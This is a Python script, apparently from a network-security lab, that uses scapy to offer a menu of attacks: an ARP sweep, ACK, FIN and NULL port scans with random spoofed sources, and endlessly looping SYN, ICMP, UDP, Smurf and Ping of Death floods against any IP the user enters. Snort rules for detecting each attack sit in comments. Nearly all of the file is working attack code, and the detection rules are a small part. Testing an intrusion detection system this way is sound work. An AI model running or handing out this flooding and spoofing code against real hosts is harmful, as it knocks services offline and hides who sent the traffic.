from scapy.all import *
from scapy.layers.inet import TCP, IP

### Reconnaissance Attacks ###

def ip_address_sweeping(dest_ip):
  # Args:
  #       dest_ip (str): An IP address or IP address range to scan. For example:
  #                   - 192.168.1.1 to scan a single IP address
  #                   - 192.168.1.1/24 to scan a range of IP addresses.

    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=dest_ip)
    result = srp(packet, timeout=3, verbose=0)[0]
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices in the network:")
    print("IP" + " "*18+"MAC")
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))

def ack_scan(dest_ip, last_port):
  packet = IP(dst=dest_ip, src=RandIP()) / TCP(dport = (0,last_port), flags="A")
  ans, unans = srloop(packet, count=1)
  print("Answer: ", ans)
  print("Unanswer: ", unans)

#Snort: alert tcp any any -> 192.168.190.0/24 any (flags: A; ack: 0; msg:"ACK Scan"; sid:1000005; rev:1;)

def fin_scan(dest_ip, last_port):
  packet = IP(dst=dest_ip, src=RandIP()) / TCP (dport = (0,last_port), flags="SF")
  ans, unans = srloop (packet, count=1)
  print("Answer: ", ans)
  print("Unanswer: ", unans)

#Snort: alert tcp any any -> 192.168.190.0/24 any (flags:SF; msg:"FIN  scan"; flow: stateless; sid:1000006; rev:1;)

def null_scan(dest_ip, last_port):
  packet = IP(dst=dest_ip, src=RandIP())/ TCP (dport = (0,last_port), flags=0)
  ans, unans = srloop(packet, count=1)
  print("Answer: ", ans)
  print("Unanswer: ", unans)
  
#Snort: alert tcp any any -> 192.168.190.0/24 any (flags:0; msg:"Null scan"; flow: stateless; sid:1000007; rev:1;)

### Denial of Service Attacks ###

def syn(dest_ip, dest_port):
    packet = IP(dst=dest_ip) / TCP(dport=dest_port, flags="S") 
    send(packet, loop=1, inter=0.02)

 #Snort: reject tcp any any -> any any (flags:S; msg:"SYN flood"; detection_filter: track by_dst, count 50, seconds 10; gid:1; sid:1000002; rev:1; classtype:attempted-dos;)   

def icmp(source_ip, dest_ip):
    icmp_packet = IP(src=source_ip, dst=dest_ip) / ICMP() # With spoofed sender address
    send(icmp_packet, iface='eth0', inter=0.02, loop=1)

 #Snort: reject icmp any any -> any any (msg:"ICMP flood"; detection_filter: track by_dst, count 1000, seconds 10; gid:1; sid:1000001; rev:1; classtype:attempted-dos;)

def udp_flood(dest_ip, dport):
    packet = IP(dst=dest_ip) / UDP(dport=dport) / ("X" * RandByte())
    send(packet, inter=0.02, loop=1)

 #Snort: reject udp any any -> any any (msg:"UDP flood"; detection_filter: track by_dst, count 100, seconds 10; gid:1; sid:1000003; rev:1; classtype:attempted-dos;)    


def smurf_attack(source_ip, broadcast_ip):
    packet = IP(src=source_ip, dst=broadcast_ip) / ICMP() / "1234567890"
    send(packet, inter=0.02)

#Snort: reject icmp any any -> 192.168.190.0/24 any (msg: "Smurf attack"; dsize: <60001; itype: 8; Sid: 1000004; rev:1;)


################################################################ Attack outside: Dorm -> Office

def ping_of_death(dest_ip):
    packet = fragment(IP(dst=dest_ip) / ICMP() / ("X" * 65500))
    send(packet, loop=1, inter=0.1)

 #Snort: alert icmp any any -> 192.168.190.0/24 any (msg:"Ping of Death"; dsize: >60000; itype: 8; icode:0; sid:1000008; rev:1;)


stop_script = False
while not stop_script:
    print('What packet would you like to send?')
    print('### Reconnaissance Attacks ###')
    print('0: IP Address Sweeping\n1: ACK Scanning\n2: FIN Scanning\n3: NULL Scanning\n')
    print('### Denial of Service Attacks ###')
    print('4: SYN Flood\n5: ICMP Flood\n6: UDP Flood\n7: Smurf Attack\n\n8: Ping of Death\n9: Exit')

    # dest_ip = '192.168.40.1'
    input_value = input('Enter command: ')

    if input_value == '0':
        print('IP Address Sweeping')
        print('192.168.190.1 to scan a single IP address or 192.168.190.1/24 to scan a range of IP addresses.')
        dest_ip = input('Enter IP Address: ')
        if (dest_ip): ip_address_sweeping(dest_ip)
        else: print('Please Enter IP Address')
    elif input_value == '1':
        print('ACK Scanning')
        dest_ip = input('Enter Destination IP Address: ')
        last_port = 2000
        ack_scan(dest_ip, last_port)
    elif input_value == '2':
        print('FIN Scanning')
        dest_ip = input('Enter Destination IP Address: ')
        last_port = 2000
        fin_scan(dest_ip, last_port)
    elif input_value == '3':
        print('NULL Scanning')
        dest_ip = input('Enter Destination IP Address: ')
        last_port = 2000
        null_scan(dest_ip, last_port)
    elif input_value == '4': 
        print('SYN Flood')
        dest_ip = input('Enter Destination IP Address: ')
        dest_port = 53
        syn(dest_ip, dest_port)
    elif input_value == '5': 
        print('ICMP Flood')
        source_ip = input('Enter Spoofed Source IP Address: ')
        dest_ip = input('Enter Destination IP Address: ')
        icmp(source_ip, dest_ip)
    elif input_value == '6': 
        print('UDP Flood')
        dest_ip = input('Enter Destination IP Address: ')
        dport = 53
        udp_flood(dest_ip, dport)
    elif input_value == '7': 
        print('Smurf Attack')
        broadcast_ip = input('Enter Broadcast IP Address: ')
        source_ip = input('Enter Spoofed Source IP Address: ')
        smurf_attack(source_ip, broadcast_ip)
    elif input_value == '8': 
        print('Ping of Death')
        dest_ip = input('Enter Destination IP Address: ')
        ping_of_death(dest_ip)
    elif input_value == '9': 
        print('Stopping the script.')
        stop_script = True
    else:
        print('Please specify an input-value between 0 and 9. The value you submitted was:', input_value, end='\n\n')

